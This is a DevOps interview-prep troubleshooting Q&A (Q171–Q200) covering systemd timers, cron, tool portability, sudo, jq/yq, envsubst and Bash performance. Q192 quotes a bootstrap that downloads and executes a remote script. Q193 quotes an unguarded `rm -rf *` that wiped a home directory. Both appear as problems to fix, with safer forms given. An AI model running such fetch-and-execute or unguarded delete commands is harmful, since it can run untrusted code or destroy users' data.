### Q171. You edited the timer from 5 minutes to 1 minute, restarted it, but it still fires every 5 minutes. `systemctl` printed `Warning: The unit file, source configuration file or drop-ins of opskit-health.timer changed on disk. Run 'systemctl daemon-reload' to reload units.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** systemd caches unit definitions. Editing the file on disk changes nothing until the manager reloads its configuration; restarting the unit reuses the cached version.

**Diagnose →**
```bash
systemctl show opskit-health.timer -p NeedDaemonReload    # yes
systemctl show opskit-health.timer -p TimersMonotonic      # still shows the old interval
```

**Fix →**
```bash
systemctl daemon-reload
systemctl restart opskit-health.timer
systemctl list-timers opskit-health.timer
```

**Prevent →** Use `systemctl edit --full opskit-health.timer` (or `systemctl edit` for drop-ins), which reloads automatically, and make config management run `daemon-reload` whenever a unit file changes.

</details>

### Q172. `systemctl enable opskit-backup.timer` prints `The unit files have no installation config (WantedBy=, RequiredBy=, ...)`, and after a reboot the timer is inactive. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `enable` creates symlinks based on the `[Install]` section. The timer has no `[Install]` section, so there is nothing to link and nothing starts it at boot. A close cousin: enabling the `.service` instead of the `.timer`, which starts the backup once at boot and never schedules it.

**Diagnose →**
```bash
systemctl cat opskit-backup.timer | grep -A2 '\[Install\]'
systemctl is-enabled opskit-backup.timer opskit-backup.service
systemctl list-timers --all | grep opskit
```

**Fix →**
```ini
# /etc/systemd/system/opskit-backup.timer
[Timer]
OnCalendar=*-*-* 02:30:00
Persistent=true

[Install]
WantedBy=timers.target
```
```bash
systemctl daemon-reload
systemctl enable --now opskit-backup.timer
systemctl disable opskit-backup.service 2>/dev/null || true   # the service is started by the timer only
```

**Prevent →** Template every timer with `[Install] WantedBy=timers.target`, and verify with `systemctl list-timers` after a test reboot.

</details>

### Q173. A backup unit restarts in a loop and then stops with `opskit-backup.service: Start request repeated too quickly.` and `Failed with result 'start-limit-hit'`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The unit has `Restart=always` (or `on-failure`) and the script fails fast, so systemd restarts it until it hits `StartLimitBurst` (default 5) within `StartLimitIntervalSec` (default 10s) and gives up. Often the unit was written as `Type=simple` with `Restart=always`, copied from a daemon template, for a job that should run once.

**Diagnose →**
```bash
systemctl show opskit-backup -p Type -p Restart -p NRestarts
journalctl -u opskit-backup -n 50 --no-pager      # the actual error is above the restart lines
```

**Fix →** A scheduled job is `Type=oneshot` with no `Restart=`; the timer handles repetition and `OnFailure=` handles alerting:
```ini
[Service]
Type=oneshot
ExecStart=/opt/opskit/bin/backup.sh
OnFailure=opskit-alert@%n.service
```
Clear the state after fixing: `systemctl reset-failed opskit-backup.service`.

**Prevent →** Separate templates for daemons and jobs. If a job needs retries, implement backoff inside the script, or use `Restart=on-failure` with `RestartSec=60` and a larger `StartLimitIntervalSec`.

</details>

### Q174. The journal shows `Failed to parse calendar specification, ignoring: daily 02:00` and then `opskit-backup.timer: Timer unit lacks value setting. Refusing.` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `OnCalendar=` takes either a shorthand (`daily`, `weekly`, `hourly`) or a full expression (`DayOfWeek Year-Month-Day Hour:Minute:Second`), not a mix. The only trigger was invalid, so the timer had no triggers and systemd refused to start it.

**Diagnose →**
```bash
systemd-analyze calendar 'daily 02:00'                  # error
systemd-analyze calendar '*-*-* 02:00:00' --iterations=3
systemd-analyze verify /etc/systemd/system/opskit-backup.timer
```

**Fix →**
```ini
[Timer]
OnCalendar=*-*-* 02:00:00
# or with a time zone (systemd 235+):  OnCalendar=*-*-* 02:00:00 Asia/Kolkata
RandomizedDelaySec=15min
Persistent=true
```

**Prevent →** Run `systemd-analyze verify` and `systemd-analyze calendar` on every unit in CI before it reaches a server.

</details>

### Q175. The backup works with `sudo -u opskit /opt/opskit/bin/backup.sh`, but from its systemd unit it fails with `Unable to locate credentials. You can configure credentials by running "aws configure".` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** systemd services do not read shell profiles. Variables you have in your session (`AWS_PROFILE`, `AWS_REGION`, a proxy setting) are absent, and `$HOME` is the service user's home, which has no `~/.aws`. On EC2, a missing or misconfigured instance profile (or IMDSv2 hop limit in containers) gives the same message.

**Diagnose →**
```bash
systemctl show opskit-backup -p Environment -p EnvironmentFiles -p User
systemd-run --pty --property=User=opskit env        # the environment a unit actually gets
sudo -u opskit aws sts get-caller-identity
```

**Fix →** Prefer an instance role (no keys on disk). Otherwise pass configuration explicitly:
```ini
[Service]
User=opskit
EnvironmentFile=/etc/opskit/opskit.env      # AWS_REGION=ap-south-1, AWS_PROFILE=backup; mode 0640 root:opskit
```

**Prevent →** Scripts validate their prerequisites at start (`aws sts get-caller-identity >/dev/null || die "no AWS credentials"`), and units declare their environment instead of inheriting it.

</details>

### Q176. After hardening the unit with `ProtectSystem=strict`, the backup fails with `tar: /var/backups/opskit/etc-20261109.tar.gz: Cannot open: Read-only file system`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `ProtectSystem=strict` mounts the entire filesystem read-only for the service, except `/dev`, `/proc` and `/sys` and paths you explicitly allow. The script's output and state directories were not whitelisted. `ProtectHome=yes` and `PrivateTmp=yes` cause similar surprises for `/home` and `/tmp`.

**Diagnose →**
```bash
systemctl show opskit-backup -p ProtectSystem -p ReadWritePaths -p PrivateTmp
systemd-analyze security opskit-backup.service | head -20
```

**Fix →** Grant write access only where the script writes:
```ini
[Service]
ProtectSystem=strict
ReadWritePaths=/var/backups/opskit
StateDirectory=opskit          # creates /var/lib/opskit, writable, owned by User=
LogsDirectory=opskit           # /var/log/opskit
PrivateTmp=yes
```

**Prevent →** Add sandboxing incrementally and run the job manually after each change with `systemctl start` (not by calling the script directly, which bypasses the sandbox).

</details>

### Q177. `journalctl -u opskit-health` returns nothing for your user, and prints `Hint: You are currently not seeing messages from other users and the system. Users in groups 'adm', 'systemd-journal' can see all messages.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** System journal entries are readable only by root and members of `systemd-journal` (and `adm` or `wheel` on some distros). The logs exist; your user cannot read them.

**Diagnose →**
```bash
id                                     # are you in systemd-journal / adm?
sudo journalctl -u opskit-health -n 20 # confirms the entries exist
```

**Fix →** Use `sudo journalctl ...`, or add on-call engineers to the group (takes effect at next login):
```bash
sudo usermod -aG systemd-journal alice
```

**Prevent →** Ship logs to a central system (journald forwarding, Vector, Fluent Bit) so nobody needs shell access to read job output, and document the group in the runbook.

</details>

### Q178. Every run of a cron job logs `another run is in progress, exiting` for hours, even though `ps` shows no copy of the script running. It uses `exec 9>/run/opskit/backup.lock; flock -n 9 || exit 0`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A `flock` lock is held as long as **any** process has that file descriptor open. The script started a background or long-lived child (`nohup ... &`, an SSH ControlMaster, a helper daemon) that inherited fd 9, and that child is still running after the script exited.

**Diagnose →**
```bash
fuser -v /run/opskit/backup.lock
lsof /run/opskit/backup.lock          # shows which PID holds it
ls -l /proc/<pid>/fd | grep backup.lock
```

**Fix →** Stop the holder, and close the lock fd for children that must outlive the script:
```bash
some_daemon 9>&- &              # child gets no copy of fd 9
# or scope the lock to one command, so nothing else inherits it:
flock -n /run/opskit/backup.lock /opt/opskit/bin/backup.sh
```

**Prevent →** Keep lock fds away from background children, and log the holder's PID in the "already running" message (`fuser` output), so this is diagnosable in one step.

</details>

### Q179. A timer with only `OnUnitActiveSec=10min` was enabled and started, but `systemctl list-timers` shows `NEXT: -` and the job has never run. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `OnUnitActiveSec=` is relative to the last time the **service** was activated. If the service has never run since boot, there is no reference point, so the timer never elapses. It only "works" on hosts where someone started the service manually once.

**Diagnose →**
```bash
systemctl list-timers --all opskit-health.timer
systemctl show opskit-health.service -p ActiveEnterTimestamp     # empty: never activated
```

**Fix →** Add a trigger that does not depend on prior runs:
```ini
[Timer]
OnBootSec=2min
OnUnitActiveSec=10min
AccuracySec=30s
```
Or use a calendar schedule: `OnCalendar=*:0/10`.

**Prevent →** Pair every monotonic `OnUnitActiveSec=` with `OnBootSec=` or `OnActiveSec=`, and verify a fresh host (or a reboot) actually runs the job.

</details>

### Q180. You dropped `logrotate-app.sh` into `/etc/cron.daily/` with mode 0755, but it never runs. `run-parts --test /etc/cron.daily` does not list it. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** On Debian and Ubuntu, `run-parts` only runs files whose names consist of letters, digits, underscores and hyphens. A dot (as in `.sh`) makes it skip the file silently. Red Hat's `run-parts` is more lenient, so the script "works on RHEL".

**Diagnose →**
```bash
run-parts --test /etc/cron.daily      # lists what would run
ls -l /etc/cron.daily/
```

**Fix →** Rename without the extension and keep the shebang: `mv /etc/cron.daily/logrotate-app.sh /etc/cron.daily/logrotate-app`. Confirm it is executable and owned by root.

**Prevent →** Avoid the `cron.daily` directories for application jobs; use a timer or an `/etc/cron.d` file with an explicit time and an absolute path.

</details>

## Troubleshooting: tools, portability, permissions and environment

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q181. On a Mac, `sed -i 's/replicas: 2/replicas: 3/' deploy.yaml` fails with `sed: 1: "deploy.yaml": extra characters at the end of d command`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** BSD `sed` (macOS) requires a backup-suffix argument after `-i`. It takes your expression as the suffix and the filename as the script, so `deploy.yaml` is parsed as the `d` command followed by junk. GNU `sed` treats the suffix as optional and attached (`-i.bak`).

**Diagnose →** `sed --version` fails on macOS (BSD sed has no `--version`); `command -v gsed` shows whether GNU sed is installed.

**Fix →** Use a form both accept, or avoid in-place editing:
```bash
sed -i.bak 's/replicas: 2/replicas: 3/' deploy.yaml && rm -f deploy.yaml.bak   # works on GNU and BSD
sed 's/replicas: 2/replicas: 3/' deploy.yaml > deploy.yaml.tmp && mv deploy.yaml.tmp deploy.yaml
```
For YAML specifically, use `yq -i '.spec.replicas = 3' deploy.yaml`.

**Prevent →** Run scripts in CI on Linux and macOS if both are supported, or require GNU tools on macOS (`brew install gnu-sed coreutils`) and detect them at start-up.

</details>

### Q182. A cleanup script fails on a developer's Mac with `date: illegal option -- d`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `date -d '7 days ago'` is a GNU extension. BSD `date` uses `-v-7d` for relative dates and `-j -f` to parse. `readlink -f`, `stat -c` and `sed -r` have the same GNU-only problem.

**Diagnose →** `date --version 2>/dev/null || echo "BSD date"`; `uname -s` shows `Darwin`.

**Fix →** Branch once in a helper, or let `find` do the date math so no date arithmetic is needed:
```bash
days_ago() {   # prints YYYY-MM-DD for N days ago on GNU or BSD date
  if date --version >/dev/null 2>&1; then date -u -d "$1 days ago" +%F; else date -u -v-"$1"d +%F; fi
}
find /var/tmp/app -type f -mtime +7 -delete      # portable, no date parsing at all
```

**Prevent →** Keep a small `lib/compat.sh` for platform differences, and test it on both platforms in CI.

</details>

### Q183. A script that works on Ubuntu fails in an Alpine-based CI image with `grep: unrecognized option: P`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Alpine uses BusyBox `grep`, which has no PCRE (`-P`) support. The script relies on Perl-style syntax such as `\d`, lookarounds or `\K`. macOS `grep` also lacks `-P`.

**Diagnose →**
```bash
readlink -f "$(command -v grep)"     # /bin/busybox
grep --help 2>&1 | head -2
```

**Fix →** Rewrite with POSIX ERE, which every grep supports, or install GNU grep in the image:
```bash
grep -oE 'version=[0-9]+\.[0-9]+\.[0-9]+' file | cut -d= -f2   # instead of grep -oP 'version=\K[\d.]+'
apk add --no-cache grep bash coreutils                          # if GNU behaviour is required
```

**Prevent →** Prefer `grep -E` in scripts; reach for `-P` only in interactive use. Pin the CI image and run the script's tests inside it.

</details>

### Q184. An `awk` one-liner works on your RHEL box but fails on Ubuntu with `awk: line 1: function gensub never defined`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `gensub()` (also `asort()`, `PROCINFO`, true multidimensional arrays) is a **gawk** extension. RHEL's `awk` is gawk; Ubuntu and Debian default to **mawk**, and Alpine uses BusyBox awk.

**Diagnose →**
```bash
readlink -f "$(command -v awk)"        # /usr/bin/mawk
awk -W version 2>/dev/null | head -1   # mawk prints its version this way
```

**Fix →** Use POSIX functions (`sub`, `gsub`, `match`, `substr`), or call `gawk` explicitly and declare it as a dependency:
```bash
# gensub(/([0-9]+)ms/, "\\1", "g") rewritten portably:
awk '{ gsub(/ms/, "", $5); print $5 }' access.log
command -v gawk >/dev/null || die "gawk is required (apt-get install gawk)"
```

**Prevent →** Write POSIX awk unless the script checks for `gawk` up front; test in the target distro's container.

</details>

### Q185. `comm -23 expected.txt installed.txt` prints `comm: file 1 is not in sorted order`, even though both files were produced with `sort`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The files were sorted under different locales (for example one on a laptop with `en_US.UTF-8`, one in cron with `C`), or with different options (`sort -f`). `comm` and `join` compare using the current locale's collation and detect the mismatch.

**Diagnose →**
```bash
locale | grep -E 'LC_COLLATE|LANG'
LC_ALL=C sort -c expected.txt; LC_ALL=C sort -c installed.txt    # -c checks order
```

**Fix →** Sort and compare under the same, explicit locale:
```bash
export LC_ALL=C
comm -23 <(sort -u expected.txt) <(sort -u installed.txt)
```

**Prevent →** Set `LC_ALL=C` (byte order, fast and stable) at the top of scripts that sort, compare or use character ranges like `[a-z]`.

</details>

### Q186. `grep ERROR /var/log/app/app.log` prints only `grep: /var/log/app/app.log: binary file matches`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The log contains NUL bytes or invalid UTF-8 (a crash mid-write, a binary payload logged by mistake, or a file preallocated with zeros after a `copytruncate`), so GNU grep treats it as binary and suppresses matching lines.

**Diagnose →**
```bash
grep -c $'\x00' /var/log/app/app.log 2>/dev/null; tr -d '\000' < /var/log/app/app.log | wc -l
grep -naP '\x00' /var/log/app/app.log | head -3       # where the NULs are (GNU grep)
```

**Fix →** Force text mode, optionally stripping NULs:
```bash
grep -a ERROR /var/log/app/app.log
tr -d '\000' < /var/log/app/app.log | grep ERROR
```

**Prevent →** Use `-a` in scripts that grep logs, and fix the root cause: `copytruncate` with an app that does not open the file in append mode leaves a sparse, NUL-filled prefix; switch to `postrotate` with a reopen signal.

</details>

### Q187. On macOS, `tr '[:lower:]' '[:upper:]' < export.csv` fails with `tr: Illegal byte sequence`, and `sed` gives `sed: RE error: illegal byte sequence`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The file is not valid UTF-8 (often Latin-1 or Windows-1252 exported from a spreadsheet), and the locale is UTF-8, so the tools refuse bytes that are not valid characters.

**Diagnose →**
```bash
file -I export.csv                         # charset=iso-8859-1
iconv -f UTF-8 -t UTF-8 export.csv > /dev/null   # reports the first invalid byte position
```

**Fix →** Convert the encoding, or process as raw bytes:
```bash
iconv -f WINDOWS-1252 -t UTF-8 export.csv > export.utf8.csv
LC_ALL=C tr '[:lower:]' '[:upper:]' < export.csv
```

**Prevent →** Normalise encoding at ingestion (`iconv` once), and set `LC_ALL=C` in scripts that treat data as bytes.

</details>

### Q188. `jq -r '.[] | select(.name == $svc) | .port' services.json` fails with `jq: error: $svc is not defined at <top-level>, line 1:`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Inside single quotes the shell does not expand `$svc`, so jq sees a jq variable that was never defined. The tempting "fix", switching to double quotes, splices raw shell text into the jq program, which breaks on quotes in the value and allows filter injection.

**Diagnose →** The error names the undefined jq variable; `echo "$svc"` confirms the shell has it.

**Fix →** Pass shell values as jq variables:
```bash
jq -r --arg svc "$svc" '.[] | select(.name == $svc) | .port' services.json
jq -n --arg host "$host" --argjson port "$port" '{host: $host, port: $port}'   # building JSON safely
```

**Prevent →** Never build jq filters (or JSON bodies) by string interpolation; use `--arg`, `--argjson` and `--slurpfile`.

</details>

### Q189. A pipeline step `yq r values.yaml image.tag` fails with `Error: unknown command "r" for "yq"`, and on another runner `yq '.image.tag' values.yaml` fails with `yq: error: argument files: can't open '.image.tag'`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** There are several incompatible tools named `yq`. mikefarah/yq v4 (Go) removed the v3 `r`/`w` subcommands in favour of expressions. The second error comes from the Python `yq` (a jq wrapper, installed via pip), which expects a jq filter and different argument handling.

**Diagnose →**
```bash
yq --version         # "yq (https://github.com/mikefarah/yq/) version v4.44.x" vs "yq 3.x" (python)
command -v -a yq
```

**Fix →** Standardise on one: mikefarah v4 syntax is `yq '.image.tag' values.yaml` and `yq -i '.image.tag = strenv(TAG)' values.yaml`. Install a pinned binary in CI:
```bash
YQ_VERSION=v4.44.3
curl -fsSL -o /usr/local/bin/yq "https://github.com/mikefarah/yq/releases/download/${YQ_VERSION}/yq_linux_amd64"
chmod +x /usr/local/bin/yq
```

**Prevent →** Pin tool versions in CI images and check at start-up: `yq --version | grep -q 'mikefarah' || die "mikefarah yq v4 required"`.

</details>

### Q190. `sudo echo 'vm.swappiness=10' > /etc/sysctl.d/99-tuning.conf` fails with `bash: /etc/sysctl.d/99-tuning.conf: Permission denied`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The redirection is performed by **your** shell, as your user, before `sudo` runs. Only `echo` gets root privileges.

**Diagnose →** The error comes from `bash:`, not from `sudo` or `echo`, which shows the shell opened the file.

**Fix →** Let a privileged process open the file:
```bash
echo 'vm.swappiness=10' | sudo tee /etc/sysctl.d/99-tuning.conf > /dev/null
echo 'extra=1' | sudo tee -a /etc/app.conf > /dev/null        # append
sudo install -m 0644 -o root -g root tuning.conf /etc/sysctl.d/99-tuning.conf
```

**Prevent →** Use `sudo tee` or `install` in scripts; better still, run the whole provisioning script as root once rather than sprinkling `sudo`.

</details>

### Q191. `kubectl` works for you, but in a script `sudo kubectl apply -f deploy.yaml` fails with `sudo: kubectl: command not found`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** sudo replaces `PATH` with `secure_path` from `/etc/sudoers` (typically `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`), so binaries in `~/.local/bin`, `/snap/bin` or `/opt/*/bin` are not found. sudo also resets most environment variables, so `KUBECONFIG` would be lost too.

**Diagnose →**
```bash
command -v kubectl                 # /home/alice/.local/bin/kubectl
sudo sh -c 'echo $PATH'
sudo grep -r secure_path /etc/sudoers /etc/sudoers.d/
```

**Fix →** Usually the real fix is to not use sudo: `kubectl` talks to an API server and needs no root. If root is genuinely required, use an absolute path and pass only what is needed: `sudo /usr/local/bin/tool --config /etc/tool.conf`.

**Prevent →** Install shared tooling into `/usr/local/bin`, avoid `sudo` for non-privileged CLIs, and use absolute paths for anything run via sudo.

</details>

### Q192. A bootstrap step `curl -fsSL "$URL" -o /tmp/install.sh && chmod +x /tmp/install.sh && /tmp/install.sh` fails with `bash: /tmp/install.sh: Permission denied`, despite the `chmod`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `/tmp` is mounted with `noexec` (CIS hardening benchmarks require it), so the kernel refuses to execute any file there regardless of its mode.

**Diagnose →**
```bash
findmnt -no OPTIONS /tmp        # rw,nosuid,nodev,noexec,...
ls -l /tmp/install.sh           # mode is fine
```

**Fix →** Run it through the interpreter, or download to a location meant for executables after verifying it:
```bash
bash /tmp/install.sh                                     # the file is read, not executed
echo "${EXPECTED_SHA256}  /tmp/install.sh" | sha256sum -c -
```

**Prevent →** Do not depend on executing from `/tmp`; verify checksums of anything downloaded before running it, and test bootstrap scripts on hardened images.

</details>

### Q193. A cleanup logged `cd: /srv/app/current/cache: No such file or directory` and then deleted the contents of the deploy user's home directory. The code was `cd $CACHE_DIR; rm -rf *`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The `cd` failed (directory missing after a release switch, or `CACHE_DIR` empty, making `cd` go to `$HOME`), the script did not stop, and `rm -rf *` ran in whatever the current directory was.

**Diagnose →** The log line order shows `cd` failing immediately before the deletions; `shellcheck` reports SC2164 ("Use `cd ... || exit` in case cd fails").

**Fix →** Never combine a relative wildcard delete with an unchecked `cd`. Delete by absolute path with guards:
```bash
: "${CACHE_DIR:?CACHE_DIR not set}"
[[ -d $CACHE_DIR && $CACHE_DIR == /srv/app/* ]] || die "refusing to clean '$CACHE_DIR'"
find "$CACHE_DIR" -mindepth 1 -delete
# or: cd -- "$CACHE_DIR" || exit 1
```

**Prevent →** `set -e` plus ShellCheck in CI, `${var:?}` on every path used in a delete, and an allow-list prefix check before destructive operations.

</details>

### Q194. A fan-out script hangs the box, and new SSH logins fail with `bash: fork: retry: Resource temporarily unavailable`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The user hit its process limit (`ulimit -u` / `nproc`, or the systemd `TasksMax=` of the user slice or service). A loop launched a background job per item with no concurrency limit (`for h in $(cat hosts); do check "$h" & done` over 5,000 hosts), or a function recursed by calling itself in a pipeline.

**Diagnose →**
```bash
ps -u deploy --no-headers | wc -l              # from root or another user
ulimit -u; systemctl show user-1001.slice -p TasksMax -p TasksCurrent
ps -u deploy -o pid,ppid,args --sort=ppid | head -30   # find the parent spawning everything
```

**Fix →** Kill the process tree (`pkill -u deploy -f fanout.sh`, or `systemctl stop` the unit), then bound concurrency:
```bash
xargs -a hosts.txt -P 20 -n 1 ./check_host.sh       # at most 20 at a time
# or in pure Bash:
for h in "${hosts[@]}"; do
  (( $(jobs -rp | wc -l) >= 20 )) && wait -n
  check_host "$h" &
done
wait
```

**Prevent →** Every fan-out has a hard concurrency cap; run batch jobs under systemd with `TasksMax=` so a runaway script cannot starve the host.

</details>

### Q195. `rsync -az ./dist/ deploy@web1:/srv/app/` fails with `protocol version mismatch -- is your shell clean?`, while `ssh deploy@web1` works fine. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** rsync speaks its protocol over the SSH channel. Something in the remote user's shell start-up files (`~/.bashrc`, `/etc/bash.bashrc`) prints output even for non-interactive shells: an `echo "Welcome"`, a `fortune`, a version banner. That text corrupts the protocol stream. `scp` with the legacy protocol fails the same way.

**Diagnose →**
```bash
ssh deploy@web1 /bin/true | od -c | head      # anything printed here is the culprit
```

**Fix →** Guard interactive-only output in the remote rc files:
```bash
# top of ~/.bashrc
case $- in *i*) ;; *) return ;; esac
```

**Prevent →** Keep shell start-up files silent for non-interactive shells, and give automation accounts a minimal, managed `.bashrc`.

</details>

### Q196. A container entrypoint renders `nginx.conf.template` with `envsubst`, and nginx fails with `nginx: [emerg] invalid number of arguments in "proxy_set_header" directive in /etc/nginx/conf.d/default.conf:12`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `envsubst` replaces **every** `$VAR` it sees, including nginx's own variables like `$host` and `$remote_addr`, which are unset in the shell environment and become empty. `proxy_set_header Host $host;` turns into `proxy_set_header Host ;`.

**Diagnose →**
```bash
sed -n '12p' /etc/nginx/conf.d/default.conf      # proxy_set_header Host ;
nginx -t
```

**Fix →** Give `envsubst` an explicit list of variables to substitute:
```bash
envsubst '${BACKEND_HOST} ${BACKEND_PORT}' < nginx.conf.template > /etc/nginx/conf.d/default.conf
nginx -t && exec nginx -g 'daemon off;'
```
The official nginx image does this for `/etc/nginx/templates/*.template`, substituting only variables that are defined in the environment.

**Prevent →** Always pass the variable list to `envsubst`, and run `nginx -t` (or the equivalent config check) before starting or reloading.

</details>

### Q197. A load check fails with `bash: ((: 4.75: syntax error: invalid arithmetic operator (error token is ".75")`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Bash arithmetic is integer-only. `/proc/loadavg`, `bc` output and many metrics are decimals, which `(( ))` and `[ -gt ]` cannot handle.

**Diagnose →** `cat /proc/loadavg` shows values like `4.75 3.10 2.02`.

**Fix →** Compare in `awk`, which uses floating point, and return the result as an exit status:
```bash
read -r load1 _ < /proc/loadavg
cores=$(nproc)
if awk -v l="$load1" -v c="$cores" 'BEGIN { exit !(l > c * 1.5) }'; then
  alert WARNING "load $load1 on $cores cores"
fi
```

**Prevent →** Do decimal maths in `awk`, and keep integers in Bash (percentages without `%`, bytes, seconds).

</details>

### Q198. Behind the corporate proxy, the alert script fails with `curl: (60) SSL certificate problem: unable to get local issuer certificate`. Someone suggests adding `-k`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A TLS-inspecting proxy re-signs HTTPS traffic with the company's own CA, which is not in the host's trust store. Less often, the server sends an incomplete certificate chain. `-k` disables verification entirely, so the webhook URL (a secret) could be sent to anyone who intercepts the connection.

**Diagnose →**
```bash
curl -v https://hooks.slack.com 2>&1 | grep -E 'issuer|subject'           # issuer is the corporate CA?
openssl s_client -connect hooks.slack.com:443 -showcerts </dev/null 2>/dev/null | grep -E 's:|i:'
env | grep -i _proxy
```

**Fix →** Trust the corporate CA system-wide, or point curl at a bundle:
```bash
sudo cp corp-root-ca.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates   # Debian/Ubuntu
sudo cp corp-root-ca.crt /etc/pki/ca-trust/source/anchors/ && sudo update-ca-trust           # RHEL family
curl --cacert /etc/opskit/corp-ca.pem ...                                                    # per-call
```

**Prevent →** Bake the CA into base images; fail CI on any `curl -k`/`--insecure` in scripts (`grep -rnE 'curl .*(-k|--insecure)' scripts/`).

</details>

### Q199. A Bash script copied into an `alpine` image fails with `env: can't execute 'bash': No such file or directory`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Alpine ships BusyBox `ash` as `/bin/sh` and does not include Bash. The shebang `#!/usr/bin/env bash` finds nothing.

**Diagnose →**
```bash
docker run --rm alpine:3.20 sh -c 'command -v bash || echo "no bash"'
head -1 entrypoint.sh
```

**Fix →** Install Bash in the image, or make the script POSIX `sh` and change the shebang:
```dockerfile
FROM alpine:3.20
RUN apk add --no-cache bash
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```
If you convert to `#!/bin/sh`, check it with `shellcheck -s sh entrypoint.sh` to catch Bashisms.

**Prevent →** Decide per image which shell you target, and lint with the matching ShellCheck dialect in CI.

</details>

### Q200. A log-summary script that took 2 minutes now takes 3 hours since traffic grew. `strace -c -f` shows millions of `clone` and `execve` calls. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The script runs external commands **per line**: `while read line; do ip=$(echo "$line" | cut -d' ' -f1); ts=$(date -d ...); ... done`. Each `$(...)` with a pipe forks one or more processes, so 4 million lines means tens of millions of forks. Runtime scales with the number of lines times the cost of a fork.

**Diagnose →**
```bash
strace -c -f -o /tmp/st.txt ./summary.sh access.log.sample; sort -k4 -rn /tmp/st.txt | head
bash -x ./summary.sh sample.log 2>&1 | grep -c '^+.*cut'      # forks per line
```

**Fix →** Move the per-line work into a single process. One `awk` pass replaces the whole loop:
```bash
awk '$9 ~ /^5/ { errors[$1]++; total++ }
     END { for (ip in errors) printf "%d %s\n", errors[ip], ip; print total > "/dev/stderr" }' \
  access.log | sort -rn | head -n 20
```
Inside Bash loops that must stay, use builtins: `${line%% *}` instead of `cut`, `printf '%(%F)T'` instead of `date`, `[[ =~ ]]` instead of `grep`.

**Prevent →** Rule of thumb: no external command inside a loop over data lines. If the logic outgrows one `awk` program, it is time for Python or Go.

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
